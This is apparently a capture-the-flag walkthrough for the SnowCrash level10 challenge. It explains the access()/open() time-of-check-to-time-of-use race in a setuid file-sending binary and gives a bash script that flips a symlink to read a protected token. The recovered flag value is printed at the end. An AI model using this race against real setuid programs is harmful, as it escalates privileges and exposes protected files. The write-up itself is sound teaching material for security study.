
```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Trying to execute level10 program

```bash
level10@SnowCrash:~$ ./level10 token
./level10 file host
	sends file to host if you have access to it
```

```bash
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

Level10 tries to send the file specified as the first argument to a remote host. However, we don't have permission to read the contents of the token file.

```bash
level10@SnowCrash:~$ strings level10 | grep access
access
	sends file to host if you have access to it
You don't have access to %s
access@@GLIBC_2.0
level10@SnowCrash:~$ 
```

From man access

```bash
NOTES
       Warning: Using access() to check if a user is authorized to, for example, open a file before actually  doing  so  using  open(2)
       creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipu‐
       late it.  For this reason, the use of this system call should be avoided.  (In the example just described, a  safer  alternative
       would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

We can take advantage of this well-known security vulnerability called a Time of Check to Time of Use (TOCTOU) race condition. This happens when a system checks for a condition (such as whether a user has permission to access a file) and then uses the result of that check to take an action (like opening the file), but between the check and the action, something changes (e.g., the file is modified or replaced).


`TOCTOU` race condition: The system checks if the user is authorized to do something (e.g., open a file) using a system call like access(2) or similar. However, between the time the system checks and the time it acts (e.g., opening the file with open(2)), there is a small window of opportunity for a malicious user to change the state of the system (for example, replacing the file with a different one or changing permissions).

`access()` uses the real user ID for permission checks (often used by programs that need to check if a real user has access).

`open()` uses the effective user ID (which might be different in setuid programs) and performs its own check.

We just need to bypass access, and `open` will use the effective user ID. Since our program has the SUID flag, we can read the contents of the token file.

## Exploitation


```bash
#!/bin/bash

touch /tmp/swap
for i in {1..5}; do
  ln -sf /tmp/swap /tmp/link;
  ln -sf ~/token /tmp/link;
done &
# for x in {1..5}; do
#   nc -l 6969;
# done &
for y in {1..5}; do
  ~/level10 /tmp/link 127.0.0.1;
done
```

woupa2yuojeeaaed06riuj63c
